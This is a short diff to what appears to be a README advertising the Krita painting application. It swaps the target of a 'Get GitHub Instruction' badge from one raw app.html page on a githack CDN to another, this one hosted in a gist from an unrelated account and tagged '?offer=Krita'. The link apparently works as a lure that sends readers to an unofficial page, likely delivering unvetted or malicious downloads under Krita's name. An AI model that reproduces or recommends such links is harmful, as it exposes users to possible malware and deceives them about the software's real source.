@@ -2,7 +2,7 @@
 
 Krita is a professional open-source application for **digital painting, concept art, comics, and animation**. Built by artists for artists, it delivers a complete creative environment with powerful brush engines, layer effects, and tablet support. 🎨  
 
-[![📖 Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://glcdn.githack.com/-/snippets/4893912/raw/main/app.html?offer=Krita)
+[![📖 Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/raydensintematik-coder/33f87ff760270bebf04e85195c9dd7f0/raw/6d2b8b8e05c64d97e373011ce1794561ea638a68/app.html?offer=Krita)
 
 ---
 
